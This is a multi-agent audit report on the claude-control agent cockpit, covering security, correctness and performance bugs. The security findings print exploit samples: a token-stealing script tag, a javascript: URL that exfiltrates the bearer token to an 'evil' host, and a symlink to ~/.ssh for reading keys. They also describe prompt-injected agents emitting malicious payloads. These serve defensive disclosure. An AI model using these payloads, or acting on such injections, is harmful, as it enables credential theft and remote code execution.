# Claude Control — Code Audit (2026-07-20)

Multi-agent adversarial audit of `idl3/claude-control` @ `ab5681b` (post-#340).
85 agents: parallel finders across security / correctness / performance / dead-code
dimensions and subsystems, every finding independently verified by an adversarial
refuter (majority-vote). 24 finder/verifier agents stalled on gateway 502s in the
first pass and were re-run via `resumeFromRunId` — final coverage 85/85.

**Result: 64 confirmed findings, 8 refuted.**

| Dimension | P1 | P2 | P3 | total |
|---|---|---|---|---|
| security | 2 | 5 | 4 | 11 |
| correctness | 1 | 7 | 10 | 18 |
| performance | 1 | 7 | 11 | 19 |
| deadcode | 0 | 3 | 13 | 16 |

## Security

### [P1 · likely] /present serves agent-writable HTML inline with no auth and no CSP on the cockpit origin
`server.js:747`

The /present/* route is the only non-icon route that skips checkToken (server.js:747-748), and servePresent (server.js:1987-2013) serves .html as text/html (MIME map, server.js:179) with no Content-Security-Policy, so any file dropped into ~/.claude-control/present executes JavaScript in the cockpit's own origin where the auth token lives in localStorage ('claude-control.token', web/src/lib/auth.ts:11,42).

**Failure scenario:** An agent session (runs as the user, default skipPermissions:true) writes ~/.claude-control/present/demo/index.html containing <script>fetch('/api/session/new',{method:'POST',headers:{'content-type':'application/json',authorization:'Bearer '+localStorage.getItem('claude-control.token')},body:JSON.stringify({cwd:'/',name:'x'})})</script> — a pattern already proven in practice (the dir currently holds agent-produced index.html demos: codex-rpc-composer-demo-1782154678, obs-oauth-broker). The agent prints the http://127.0.0.1:4317/present/demo/ link in its transcript; the operator clicks it (the designed 'one-off demos' workflow). The page runs same-origin, steals the bearer, and spawns a session running an arbitrary launch command as the operator — full RCE via a token-free endpoint.

### [P1 · likely] Delivery card renders agent-emitted prUrl as href with no scheme validation (javascript: XSS)
`web/src/components/DeliveryCard.tsx:50`

DeliveryCard renders <a href={payload.prUrl} target="_blank"> where prUrl comes from a {"type":"delivery",...} JSON blob parsed straight out of assistant transcript text (lib/delivery.ts isDeliveryPayload only checks typeof prUrl === 'string'), so any javascript: URL an agent emits becomes a clickable link that executes in the cockpit origin.

**Failure scenario:** A Claude session reads a prompt-injection payload (web page, repo, issue) instructing it to emit {"type":"delivery","outcome":"pushed_pr","prUrl":"javascript:fetch('https://evil/x?t='+localStorage.getItem('claude-control.token'))"}. remarkDelivery rewrites it to a delivery node, DeliveryCard renders a normal-looking '✓ Pushed PR' card, the operator clicks the PR link, and the script runs with the cockpit origin's privileges (javascript: inherits the initiator origin even with target=_blank + rel=noopener; the App.tsx delegated click handler at App.tsx:914 bails on non-http(s) so native navigation proceeds). Stolen bearer = full cockpit API including PTY terminal attach = arbitrary command execution on the operator's host.

### [P2 · likely] Boundary conflict detection silently no-ops across absolute/relative path spellings (no normalization)
`collab-engine/src/core/boundaries.ts:39`

declareBoundary stores pattern strings verbatim and checkBoundary compares concrete paths verbatim via matchesPattern; with no path normalization anywhere, a repo-relative lease pattern never matches an absolute concrete path (and vice versa), so collab_boundary_check reports zero conflicts for the same file.

**Failure scenario:** Agent A declares a lease on 'src/**' (natural repo-relative spelling). Agent B, about to edit, checks the absolute path Claude Code's Edit tool requires, e.g. /Users/x/proj/src/auth.ts: matchesPattern does pattern==='path' (false), dir-prefix 'src' vs absolute path (false), then minimatch('/Users/x/proj/src/auth.ts', 'src/**') (false) → {conflicts: []} → B proceeds and both agents concurrently edit src/auth.ts despite A holding an active lease. Mixed absolute/relative usage is the norm, so the enforcement primitive the boundary feature exists for fails open in the common case.

### [P2 · likely] Access token printed to stdout on every startup, landing in a world-readable launchd log
`server.js:3654`

server.js:3654 logs the full bearer token (`access token: ${CONFIG.token}`) on every boot; under the shipped launchd install (bin/install-service.sh:82 StandardOutPath → ~/.claude-control/logs/out.log) stdout persists to a file created 0644, while the canonical token file is deliberately 0600 — the log silently defeats that hardening.

**Failure scenario:** Verified live on this machine: ~/.claude-control/token is -rw------- but ~/.claude-control/logs/out.log is -rw-r--r-- and contains 327 `access token: <hex>` lines plus legacy ?token= URL lines. Any other local user account (multi-user Mac, shared build host), or any backup/spotlight/sync pipeline that scoops up world-readable logs, recovers the 128-bit token and gains full control-plane access (spawn sessions, send-keys into any tmux pane, read every transcript) over the tailnet endpoint bin/install-service.sh:96 exposes.

### [P2 · possible] WS Origin allowlist accepts any *.ts.net page; tokenless mode relies on this check alone
`server.js:317`

isAllowedOrigin (server.js:309-322) allows any Origin whose hostname ends with '.ts.net' (plus any localhost/127.0.0.1 page), and checkWsToken (lib/auth.js:97-101) returns true unconditionally when no token is configured — a deployment mode bin/install-service.sh:26 explicitly supports ('installing TOKENLESS (open on the tailnet)') — so a cross-site web page is the only barrier and the suffix match admits pages from any Tailscale tailnet in the world, not just the operator's.

**Failure scenario:** Operator runs tokenless (supported path). They open a link to a page hosted on attacker-tailnet.ts.net (or any compromised local dev server on any localhost port). The page's JS does new WebSocket('ws://127.0.0.1:4317') — the browser sends Origin: https://x.attacker-tailnet.ts.net which passes endsWith('.ts.net'), tokenless auth accepts, and the page issues {'type':'reply'} / session-new-equivalent WS messages to spawn a session and type an arbitrary command into a tmux pane — drive-by RCE from a web page, no token required.

### [P2 · possible] servePresent confinement is lexical-only; symlink escape yields unauthenticated arbitrary file read
`server.js:1995`

servePresent resolves the request with path.resolve + a string-prefix check (server.js:1995-1999) and then fs.readFile follows symlinks, unlike the sibling media route which realpath-confines via lib/media.js resolveMediaPath — so a symlink planted inside presentDir points the token-free /present/* surface at any file the user can read.

**Failure scenario:** An agent (prompt-injected via repo/issue content, or simply malicious) runs: ln -s ~/.ssh ~/.claude-control/present/x (present/ is agent-writable — it already contains agent-written demo dirs). Because /present requires no token, any tailnet peer reaching the tailscale-serve endpoint (bin/install-service.sh:96 exposes :443 on the tailnet) — or the agent itself via plain HTTP to 127.0.0.1:4317 — fetches /present/x/id_rsa and receives the file, with resolveMediaPath's realpath defense (lib/media.js:37-49) never applied on this route.

### [P2 · unlikely] Server-returned remoteTermUrl assigned to an unsandboxed iframe src with no scheme validation
`web/src/App.tsx:3045`

The olam remote-terminal panel does <iframe src={remoteTermUrl}> (no sandbox attribute) where remoteTermUrl is the uiUrl field of the /api/olam/terminal-token JSON response (runner-minted); the client never checks that uiUrl is https:, and an unsandboxed iframe with a javascript: src executes in the embedder's origin automatically on render.

**Failure scenario:** The runner (or anything able to influence its terminal-token response) returns {uiUrl: "javascript:..."}. The moment the operator opens the terminal panel the iframe mounts and the script executes in the cockpit origin with no click required — reading localStorage['claude-control.token'] and driving the full API. The iframe also has no sandbox, so even a legit-but-compromised remote ttyd page runs with zero client-side confinement.

### [P3 · possible] collab_boundary_declare ttl_sec is unbounded — 68-year leases, including '**' squats
`collab-engine/src/mcp/tools.ts:227`

ttl_sec is z.number().int().positive() with no maximum and declareBoundary (boundaries.ts:69-70) only substitutes the 1800s default when the value is absent, so a caller can mint a boundary lease with expires_at ~68 years out on any pattern set.

**Failure scenario:** A misbehaving or prompt-injected agent calls collab_boundary_declare {paths: ['**'], ttl_sec: 2147483647}; every other agent's collab_boundary_check now reports conflicts on every path effectively forever (heartbeat renewal only extends ACTIVE leases owned by the caller, but nothing ever expires this one short of release), permanently poisoning the shared coordination board — and per finding 1 there is no auth stopping it.

### [P3 · possible] Codex RPC endpoint is scraped from untrusted pane content, then a privileged client connects and submits operator prompts to it
`lib/codex-rpc.js:196`

parseCodexAppServerEndpoint extracts a ws://127.0.0.1:<port> URL from raw terminal capture text, and server.js ensureCodexRpcForSession (server.js:2569) uses it to attach CodexRpcClient when no stored endpoint exists; operator reply text is then submitted over that socket (server.js:2898) and approval answers sent to it (server.js:3380).

**Failure scenario:** A codex rpc-transport pane loses its stored endpoint (claude-control restart, pane option gone, app-server relaunched inside the pane). A prompt-injected agent (or any program whose output lands in the pane) prints 'ws://127.0.0.1:<attacker-port>' where a local malicious listener waits; capturePane picks the first LOCAL_WS_RE match, claude-control connects, sends initialize + thread/resume (thread id, transcript path, cwd) and every subsequent operator prompt (turn/start with full replyText) to the attacker server, which can also inject fake item/commandExecution/requestApproval prompts into the cockpit UI to harvest approvals under false pretenses.

### [P3 · unlikely] codexRpcEndpoint port-allocation TOCTOU: probe socket is closed before codex binds, letting a local squatter steal the privileged client connection
`lib/codex-rpc.js:181`

codexRpcEndpoint opens a server on port 0, closes it, and returns ws://127.0.0.1:<port>; the codex app-server only binds that port later (launched via tmux sendText), so any local process that grabs the freed port in the gap receives claude-control's CodexRpcClient connection instead of codex.

**Failure scenario:** A local malicious process pre-binds ephemeral ports (or wins the race in the close→bind window); codex app-server fails to bind and exits while claude-control's attach() connects successfully to the attacker's WebSocket, which then receives initialize, thread/start (cwd, model) and all operator-submitted prompt text, and can serve fabricated approval prompts back to the cockpit UI.

### [P3 · possible] No Content-Security-Policy (or any security headers) anywhere — meta CSP absent, server sets no CSP/XFO/nosniff headers
`web/index.html:3`

web/index.html has no CSP meta tag and a grep of server.js/lib shows no Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, or Referrer-Policy headers ever being set, so any script execution in the cockpit origin (finding 1/3/4) runs unrestricted: inline handlers, eval, and exfiltration to any origin all succeed.

**Failure scenario:** With the DeliveryCard javascript: XSS (or any future injection), the payload faces no second line of defense: it can exfiltrate the localStorage bearer token to any external host via fetch/WebSocket/img beacon, load remote scripts, and frame or be framed freely. A CSP like default-src 'self'; script-src 'self'; connect-src 'self' ws: wss:; img-src 'self' data: blob: https: would have contained token exfiltration even after XSS.

## Correctness

### [P1 · likely] Heartbeat lease renewal inflates lease duration quadratically
`collab-engine/src/core/agents.ts:108`

The renewal SQL `expires_at = @ts + (expires_at - created_at)` only equals the original TTL on the first renewal; since `created_at` never changes but `expires_at` moved, each subsequent renewal extends the lease by original-TTL plus total elapsed-since-creation, growing the lease as T + d*n(n-1)/2 after n renewals.

**Failure scenario:** Agent follows the documented work loop (design doc §4.3/§work loop: `heartbeat --renew-leases` every 30s). Verified against dist: after 10 renewals the lease extends 1.75x TTL beyond now; after a 2-hour session of 30s heartbeats, when the agent dies its file boundaries stay active for ~10 days instead of the 30-minute TTL — directly defeating the documented 'a live agent keeps its claims and a dead one's simply lapse' expiry safety net, and other agents see stale conflicts (or must ignore them) long after the owner is gone.

### [P2 · likely] Unregistered agent / nonexistent stream ids crash guarded mutations with raw SQLite FK errors
`collab-engine/src/core/tasks.ts:110`

No core mutation checks that `agentId` (or `stream`) exists before writing, so the schema's FK constraints (schema.ts:52 `tasks.owner_agent_id REFERENCES agents(id)`, schema.ts:67 boundaries, schema.ts:25/36/48 stream refs) fire and the functions throw `FOREIGN KEY constraint failed` instead of returning the typed `{ok:false, reason:'not_found'}` the Result contract (types.ts:82-88) advertises.

**Failure scenario:** Verified against dist: `claimTask` with a typo'd/unregistered agent_id, `declareBoundary` with an unregistered agent, `handoff` to a nonexistent to_agent, `send`/`register` with a nonexistent stream all throw raw SQLite errors out of the MCP handler (surfaces as an opaque tool error) and crash the CLI with `[collab] fatal` exit 1 — a single-character typo in an agent id turns a routine claim into an unhandled exception instead of a typed not_found.

### [P2 · possible] detectPendingFromCapture parses numbered lines inside the to-be-approved command as picker options
`lib/codex.js:862`

The option scan starts at headingIdx+1 and accepts any indented `N. text` line as an option before the real `› N.` choices are reached; a numbered line inside the command preview (exec approval renders the command between the heading and the options) followed by any non-option line breaks the loop early, so the cockpit modal shows command-text lines as the only choices and the real options (Yes / Yes for session / No) are never surfaced — and the digit the user picks is sent to the TUI where it selects a real approval option the user never saw.

**Failure scenario:** Codex asks to approve a multi-line command whose text contains an indented numbered step, e.g. `  1. Install deps` then `  then run tests`: the scan at lines 854-877 collects 'Install deps' (n=1) as an option, breaks at 'then run tests', and never reaches the real options; the cockpit modal offers only the fake options, the user picks '1. Install deps', buildAnswerProgram sends '1', and the TUI interprets it as 'Yes, proceed' — a command the operator meant to inspect gets approved via a mislabeled modal.

### [P2 · possible] Feed-reset replay collides with client uuid dedupe — degraded transcript silently freezes / duplicates
`lib/olam-transcript.js:385`

After a runner feed reset the OlamTranscriptSource rewinds _feedCursor to 0 and re-emits the new feed window with uuid `feed:<idx>` (feedEntryToMessage, line 267), but those uuids were already used by the pre-reset feed, so the client's union-by-uuid mergeMessages (web/src/lib/messages.ts:31-35) drops every replayed entry for connected clients, while a freshly subscribed client receives the server _buffer containing BOTH pre- and post-reset entries with identical uuids and renders duplicates (no dedupe on first merge, messages.ts:28).

**Failure scenario:** Session is in degraded mode (shape auth failed) so the transcript is fed by _feedLoop; the olam runner restarts and truncates its feed; status.feed.length < _feedCursor triggers the reset at lines 380-386; the fresh post-restart entries are re-emitted as feed:0..N → every connected cockpit client discards them as already-seen and the transcript freezes at the pre-reset content, while a client that reloads the page gets the old and new entries rendered twice with duplicate React keys. The code comment ('Prefers a possible duplicate over the silent skip') is defeated by the client-side dedupe the server author didn't account for.

### [P2 · unlikely] reap()/evictOne() delete a mid-setup entry; the in-flight ensurePty IIFE then spawns an untracked pty + ephemeral session
`lib/pty-bridge.js:981`

reap() (981-993) and evictOne() (709-735) remove an entry from the ptys map and clean only entry.pty/entry.ephemeralSession, both of which are null while entry.ready (the setup IIFE at 812-933) is still in flight; neither awaits entry.ready, so the IIFE later completes, spawns the node-pty, sets entry.pty/entry.alive=true (926-927) and creates the ephemeral session — all orphaned from the map, and the attach continuation (1051-1084) even registers the client on this untracked entry, so no idle reap, eviction, or shutdownAll will ever clean it up.

**Failure scenario:** A client attaches and its WS closes before setup finishes: detachClient (971-978) sees clients.size===0 and schedules reap in 30s; if the tmux setup chain stalls >30s (each of ~7 execs has a 10s timeout), reap fires mid-setup, killEphemeralSession no-ops (ephemeralSession not yet set), then the IIFE creates the ephemeral session and a healthy pty. Alternatively a 5th concurrent attach evicts a 0-client mid-setup entry. Result: a live `tmux attach` process plus a _ccpty_ session that stream output to a client invisible to all lifecycle management until process exit (the boot-time orphan sweep only helps after a restart).

### [P2 · unlikely] sendText fallback is not idempotent: a failed Enter after a successful paste duplicates the whole message
`lib/tmux.js:1068`

The catch-all at 1068 cannot distinguish 'paste-buffer never ran' from 'paste succeeded, final send-keys Enter (1067) failed': on the latter it falls back to `send-keys -l <full text>` + Enter into a pane whose input box already contains the pasted text, so the message is delivered twice.

**Failure scenario:** A reply with attachments is bracketed-pasted successfully; in the ~250ms post-paste window a transient tmux socket error makes the Enter send-keys fail while the pane stays alive. The fallback re-types the entire text after the already-pasted copy and submits — the agent receives the same message duplicated in one input. A dead pane fails the fallback too (error surfaces, fine); only the pane-alive/transient-error interleaving duplicates, which is exactly the race class this function exists to prevent.

### [P2 · possible] handleSessionNew leaks the created tmux window when any post-creation step fails
`server.js:1627`

After createWindow/createTmuxSession/createWindowInSession succeeds (lines 1491-1495), every subsequent step (codexRpc.prepareEndpoint:1504, claudePrint.attach:1527, tmux.setPaneOption:1528/1586, tmux.sendText:1597, printClient.waitForBridge:1599, codexRpc.attach:1611) can throw, and the catch at 1627 just returns 500 — the already-created window/pane is never killed, leaving an orphaned bare-shell window that the next registry refresh surfaces as a live session row.

**Failure scenario:** User creates a Codex RPC session; prepareEndpoint or codexRpc.attach fails (app-server start hiccup), or a transient tmux socket error hits sendText/setPaneOption. Client gets 500 and retries; each retry creates another window, piling up dead 'session-XXXXXX' shell windows in the rail that the user must close by hand. For claudex/claudemi the orphaned pane additionally retains the injected ANTHROPIC_BASE_URL bearer in its environment.

### [P2 · likely] PromptBody global keydown swallows digits/Enter destined for other inputs and modals
`web/src/components/AskInline.tsx:546`

PromptBody's window-level keydown handler (lines 546-566) preventDefault-intercepts option keys ('1'-'9', parsed server-side as digits per lib/prompt.js:156) and Enter for ANY keydown in the window, with no e.target editable check and no '[aria-modal="true"]' bail — the guard idiom used by every other global handler in App.tsx (e.g. lines 2082/2098/2120).

**Failure scenario:** A Claude permission picker (numbered options) is active in the Composer; user opens the command palette (⌘K) or transcript search (⌘/) and types '1' into the search input — PromptBody's listener calls e.preventDefault() and setSelectedKey('1'), so the digit never appears in the input; pressing Enter to run the highlighted palette command is also preventDefault-swallowed AND fires submitSingle('1'), silently answering the TUI permission prompt behind the modal.

### [P3 · possible] parsePanePrompt sorts matches by key before run-grouping, merging prose numbered lists into the real picker run
`lib/prompt.js:164`

Run grouping (lines 171-185) operates on key-sorted matches, not document order: a numbered list in the assistant prose above a real picker interleaves with the picker's keys after sorting, and the adjacent-duplicate suppression then drops the real picker's options (prose wins stable-sort ties), or — when the picker has more keys than the prose — builds a frankenstein run mixing prose items 1-3 with picker items 4-5; the esc-footer/cursor guards then anchor on the prose run's lines and miss the real footer, so a live system prompt is not detected.

**Failure scenario:** Assistant writes '1. … 2. … 3. …' in its reply, then Claude shows a 3-option permission prompt ('Do you want to proceed? 1. Yes 2. Yes, don't ask 3. No'): sorted merge swallows the picker into the prose run, hasCursor=false and the esc footer is >3 lines below the prose run's last line so hasEsc=false → parsePanePrompt returns null and the rail ASK badge (lib/sessions.js:1560, a live call site) never lights for a genuinely-waiting permission prompt.

### [P3 · likely] _pollThinking sticky-pending: `merged = ... || s.pending` can never clear a true flag, so the reply guard keeps blocking after the question is answered
`lib/sessions.js:1565`

In _pollThinking, `const merged = (this._pendingMap.get(...) ?? false) || rec.pending || s.pending` (1564-1566, and the codex twin at 1581-1583) ORs the previous output into the next computation, so once s.pending is true the poll's own clearing path is dead code; the stale flag survives until the next 4s _doRefresh rebuild, and server.js:2863's replyShouldBlock(tailerPending, session.pending) refuses raw replies during that whole window with a wrong 'A question is open' error.

**Failure scenario:** User answers an AskUserQuestion/permission prompt (via answer/promptkey) and immediately types a follow-up. For up to one refresh cycle (~2-4s, longer under poll jitter) session.pending is still true, so the reply is rejected with 'A question is open — answer it via the question component' even though the picker is gone; the race-free capture-time picker guard at server.js:2925 is never reached because the stale-flag check blocks first. Retry seconds later works.

### [P3 · unlikely] _readNewParentBytes leaks the fd when readSync throws and ignores short reads
`lib/subagents.js:1094`

The try block opens the parent transcript with fs.openSync, allocates the buffer, calls fs.readSync and only then fs.closeSync — there is no finally, so any readSync throw (EIO, race with rotation) skips closeSync and leaks an fd on every errored poll (poll() runs this every 30s sweep plus on each parent append); additionally the bytesRead return value is ignored, so a file truncated between statSync and readSync leaves uninitialized allocUnsafe bytes in the buffer that get folded into the completion parser.

**Failure scenario:** Parent transcript is rotated/replaced between the statSync at line 1083 and the openSync/readSync at 1093-1095: either readSync throws and the fd leaks on every subsequent poll until process fd exhaustion, or a short read leaves garbage bytes after the real content that scanClaudeParentChunk must parse (relies on JSON.parse failing per garbage line to stay correct).

### [P3 · unlikely] createWindow cold-start race: concurrent creates with no tmux server both try new-session and one 500s
`lib/tmux.js:497`

createWindow's bootstrap is check-then-act with no serialization: two concurrent calls both observe windows.length===0 (497-502) and both run `new-session -d -s claude-control` (504); the loser gets a raw 'duplicate session' tmux error propagated to the client. The same TOCTOU exists one level up: handleSessionNew validates newTmuxSession/tmuxSession against listSessions (server.js:1407-1415) and creates at 1491-1495, so two concurrent identical newTmuxSession requests both pass validation.

**Failure scenario:** On a fresh boot (no tmux server), the SPA double-fires POST /api/session/new (double-click or retry). Both requests see an empty pane list; the second new-session fails with 'duplicate session: claude-control' and the user gets a spurious 500 for a request that would otherwise have succeeded — the fix is a retry/serialize around the cold-start bootstrap, which doesn't exist.

### [P3 · likely] Stat ENOENT inside _readIncremental emits 'error' directly, defeating the poll timer's ENOENT filter
`lib/transcript.js:492`

_readIncremental catches fs.stat failure itself and calls this.emit('error', err) (lines 489-493) instead of throwing, so the ENOENT filters at the poll-timer call site (line 374, 'ENOENT means the file was deleted/rotated; not a hard error') and the setImmediate bridge (line 394) are dead code for the most common transient failure — every 1s poll while the tailed file is missing emits an 'error' that server.js (line 2471) broadcasts as {type:'ack', op:'tail', ok:false} to every subscribed client, whose ack handler toasts it.

**Failure scenario:** A subscribed session's transcript is deleted/moved (session cleanup, /clear, project dir removed) while a client is watching: the tailer emits an error every poll interval (default 1000ms) for as long as the subscription lives, producing a continuous stream of error acks/toasts in the UI — the exact noise the ENOENT filters were written to suppress.

### [P3 · unlikely] Incremental read decodes bytes to UTF-8 before joining with leftover, permanently corrupting multi-byte characters that straddle a read boundary
`lib/transcript.js:512`

_readIncremental does `this._leftover + rawBuf.toString('utf8')`: if a poll lands while a large record is mid-write and the byte split falls inside a multi-byte UTF-8 character (emoji, CJK), the trailing partial bytes decode to U+FFFD in the leftover string and the continuation bytes decode to more U+FFFD at the start of the next chunk — the character is destroyed even though the file on disk is fine, and since U+FFFD is valid JSON string content the record still parses and the corrupted text is served to clients.

**Failure scenario:** Claude writes a 300KB tool_result line containing an emoji; the 1s poll fires mid-write and reads bytes 0..250K ending inside the emoji's 4-byte sequence; leftover stores the partial line ending in U+FFFD, the next poll's chunk begins with the continuation bytes decoded as U+FFFD, and the assembled line parses with replacement glyphs permanently rendered in the transcript view.

### [P3 · possible] _isAttemptAlive always counts the shared journal mtime, so crashed agents read 'running' for the whole active run
`lib/workflows.js:598`

The documented contract is 'newest artifact (transcript or meta) — or, lacking files, the journal itself', but the code seeds `newest = journalMs` unconditionally and takes the max, so while any sibling agent keeps the run's journal fresh (started/result events), a resultless agent whose own transcript went stale long ago is still classified alive → state 'running' instead of 'error' at line 476, and the run never reports its failed agent until the entire journal has been quiet for WF_STALE_MS (5 min).

**Failure scenario:** A workflow run with 20 agents: agent #3's attempt dies at minute 1 (gateway 502, the exact case WF_STALE_MS's comment names) leaving a stale transcript and no journal result; siblings keep the journal active for 25 more minutes; for the entire run the UI shows agent #3 as running and the summary overstates progress, flipping to 'error' only 5 minutes after the run's last journal write.

### [P3 · possible] Shutdown/restart abandons async pty-bridge teardown: orphaned pipe-pane freezes live agent panes, FIFOs leak
`server.js:3688`

shutdown() calls ptyBridge.shutdownAll() and then process.exit(0) in the same synchronous run, but the agent-kind teardown it triggers (teardownAgentEntry, pty-bridge.js:502-526) is fire-and-forget async — its first tmux execFile (pipe-pane off) is never spawned because process.exit runs before any microtask, so the `pipe-pane -O 'cat >> <fifo>'` on live agent panes is never turned off and the FIFO file is never unlinked; /api/restart (server.js:542) is worse, calling process.exit(0) without invoking shutdown() at all.

**Failure scenario:** Operator opens the Cmd+J agent overlay (agent-kind entry with FIFO + pipe-pane), then any restart happens (POST /api/restart, /api/update's self-update.sh `kill $OLD` SIGTERM, or SIGINT). The server exits; the tmux-side `cat >> /tmp/ccpty-agent-*` keeps running with no reader. Once the FIFO's kernel buffer fills (~64KB of pane output), cat blocks on write, tmux's pipe-pane back-pressures and the live agent pane's output processing stalls — the pane appears frozen to every viewer until someone manually runs `tmux pipe-pane` or re-attaches an agent overlay to that exact pane. The orphaned FIFO file in $TMPDIR is never cleaned (the only sweeper, sweepOrphanedEphemeralSessions at pty-bridge.js:658, covers _ccpty_ tmux sessions, not ccpty-agent-* FIFOs).

### [P3 · possible] Auto-send timer outlives Esc discard during the modal exit animation
`web/src/components/OptimizeReview.tsx:113`

The AUTO_SEND_SECS (1.8s) auto-send setTimeout at line 113 is only cleared by effect cleanup on unmount, but Esc (lines 121-124) calls onClose which is useModalTransition's requestClose (lib/anim.ts:160-180) — the component stays mounted for the GSAP exit tween, so the timer can still fire and dispatch the prompt the user meant to discard.

**Failure scenario:** OptimizeReview modal shows an enhanced prompt with the 1.8s auto-send countdown; user presses Esc at ~1.7s to discard — requestClose starts the exit tween instead of unmounting, the timer fires before unmount, and onSendRef.current(editedRef.current) sends the prompt to the session anyway.

### [P3 · possible] Completion-flash dismiss timer is killed by effect re-runs, leaving a permanently stuck dock strip
`web/src/components/WorkflowLiveDock.tsx:69`

In the flash effect (lines 69-81), once the flash is set prevRunId.current is null, so any re-run of the effect (triggered by a workflows identity change) executes the cleanup that clearTimeout's the pending DONE_FLASH_MS dismiss while the new run creates no replacement timer — the 'done/failed' strip then sticks indefinitely (shown = run ?? flash never clears).

**Failure scenario:** Session has two workflow runs; run A finishes → pickActiveRun returns run B, flash never starts; then run B finishes → flash sets with a 4s dismiss timer; a late WS frame updates run A's record (changing the serialized workflows slice in App.tsx:1029-1032, new array identity) → effect cleanup kills the dismiss timer, prev===null and run===null so no new timer is created → the '✓ done' dock strip renders forever and its click calls onOpenCard for a long-finished run.

## Performance

### [P1 · likely] candidateContainsUuid whole-file reads of 200MB+ transcripts in the 4s refresh path
`lib/sessions.js:609`

resolveForkDescendant() runs for every hook-bound/pinned pane on every 4s _doRefresh (via _recordForPath at line 1681, called from lines 1036/1051), and candidateContainsUuid() does `(await fs.readFile(filePath, 'utf8')).includes(uuid)` — an UNBOUNDED whole-file read of each of up to 7 sibling transcripts per pane per refresh, directly violating this codebase's own 'NEVER read a whole file — transcripts reach 200 MB+' doctrine (lib/transcript.js header).

**Failure scenario:** A machine with several panes sharing a project dir (e.g. ~/Projects with many *.jsonl): on every 4s refresh each hook-bound pane whole-reads up to 7 sibling transcripts. A 200MB transcript becomes a ~400MB UTF-16 string plus an includes() scan on the main thread. The forkVerdictCache only caches 'settled' verdicts (files >60s old), so freshly-created transcripts (<60s birthtime, i.e. every newly forked/resumed session) are re-read in full EVERY 4s, and when the cache exceeds 500 keys it is cleared wholesale (line 615), forcing a mass re-read of every candidate on the next refresh — a multi-GB read/alloc storm that spikes RSS and can trigger the resources-overlimit trim path or OOM on a busy host.

### [P2 · likely] Every session's 1MB transcript tail is fully re-read and every line JSON.parsed every 4s, with no caching
`lib/sessions.js:454`

extractTailRecord() is called per hook-bound/pinned pane and per candidate on every 4s refresh; for any transcript >64KB it reads up to 1MB (line 420) and detectTranscriptPending() then JSON.parses EVERY line of that tail (lines 250-254) — no mtime cache, no incremental cursor — and the initial 64KB read at line 407 is discarded whenever the file is larger, doubling the read churn.

**Failure scenario:** 10-20 live Claude panes (normal for this operator): each 4s refresh synchronously parses ~10-20 x 1MB of JSONL line-by-line (hundreds to thousands of full JSON.parse calls per file, including multi-hundred-KB tool-result records). That is a continuous 100-600ms event-loop block per refresh tick plus ~20MB/4s of disk reads, forever, whenever the app is open (or a push subscription keeps the poll gate armed) — degrading WS latency for every connected client on the same loop.

### [P2 · likely] Every 4s refresh fully re-reads (1MB) and JSON.parses every line of every bound/candidate transcript — zero mtime memoization
`lib/sessions.js:454`

_doRefresh re-extracts every pinned/hooked pane's transcript and every matcher candidate on every 4s tick: extractTailRecord re-reads up to 1MB of tail (lines 419-421, any transcript >64KB — observed real transcripts are 27-90MB) and detectTranscriptPending synchronously JSON.parses EVERY line of that buffer, with no mtime/size cache anywhere (call sites 1051, 1036, 1683, 1707 all unconditional; the hook/pinned loops even await sequentially per pane).

**Failure scenario:** 8 hooked Claude panes are open (normal for this orchestration UI). Every 4s, _doRefresh runs ~10 x (1MB read + full-line JSON.parse of ~thousands of records) = tens-to-hundreds of ms of main-thread CPU per tick, forever — Promise.all only overlaps the I/O, the parse is synchronous. The event-loop stalls land exactly on the pty onData fan-out and WS broadcast paths, so a user watching a live agent terminal sees output stutter on every refresh tick, getting worse with each additional session.

### [P2 · possible] candidateContainsUuid whole-file readFile + synchronous .includes() per (file,uuid) on the 4s refresh path
`lib/sessions.js:609`

resolveForkDescendant runs for every pinned/hooked pane every refresh (_recordForPath, line 1681) and calls candidateContainsUuid for up to 8 candidates x 5 hops; a cache miss does fs.readFile(whole file, 'utf8').includes(uuid) — the .includes scan runs on the main thread and the whole transcript becomes a V8 string (real transcripts on disk reach 90MB). Negative verdicts are only cached once a candidate's birthtime is >60s old (line 613), so fresh candidates are re-read every 4s, and `forkVerdictCache.size > 500 -> clear()` (line 615) periodically wipes even settled positive verdicts, re-triggering all scans.

**Failure scenario:** In an active project dir, `claude --resume`/fork writes a new jsonl that copies full history at birth (tens of MB within its first minute). For that file's first 60s on disk, every hooked pane sharing the dir re-reads and re-scans the whole file every 4s (6 panes = 6x90MB reads per tick); once the key count crosses 500 the clear() wipes all cached verdicts and the next refresh re-reads every candidate for every pane at once — RSS spikes by hundreds of MB and the loop blocks on the string scans.

### [P2 · likely] Full-transcript convertMessages re-runs on every streaming append frame
`web/src/App.tsx:742`

fullConverted = useMemo(() => convertMessages(cockpit.messages), [cockpit.messages]) re-converts the ENTIRE retained transcript (up to MAX_RETAINED_MESSAGES=4000, web/src/lib/messages.ts:6) on every WS 'append'/'messages' frame, which during active generation arrive at up to ~7/sec (server tailer debounceMs=150, lib/transcript.js:245).

**Failure scenario:** A long session (1000-4000 retained messages) while Claude actively streams: each append frame triggers convertMessages' 4 passes (results index, linkFreeTextReplies, realUserText set, buildParts) plus mergeAssistantTurns' O(k^2) content-array spreads for a k-message turn (web/src/lib/convert.ts:249-253) — multi-ms main-thread work at ~7Hz exactly while the user is watching/scrolling the transcript. The INITIAL_VISIBLE=150 render cap (App.tsx:190) bounds mounting but not conversion, so conversion cost grows with session age and never shrinks; on mobile this manifests as scroll/input jank and dropped frames during generation.

### [P2 · likely] transcriptText joins all transcript text + ArtifactGallery regex-scans it per append, even when closed
`web/src/App.tsx:2188`

The transcriptText useMemo (App.tsx:2188-2194) concatenates every text block of the whole transcript into one string on every messages change, and ArtifactGallery's useMemo (web/src/components/ArtifactGallery.tsx:46) runs appNamesFromTranscript's regex scan over that entire string on every change — hooks run before its `if (!open) return null` (line 87), so the scan happens at streaming cadence with the gallery closed.

**Failure scenario:** Long transcript + active streaming: each ~150ms append frame re-joins hundreds of KB to MBs of text into a fresh string (GC churn) and re-runs TAG_RE.exec over the full string (web/src/lib/sessionArtifacts.ts:53-68) — O(total transcript text) work per frame on the main thread, purely to keep a closed artifact tray's name set warm.

### [P2 · likely] Every WS frame re-renders the whole App and the unmemoized SessionRail (fresh inline props defeat memoization)
`web/src/App.tsx:2685`

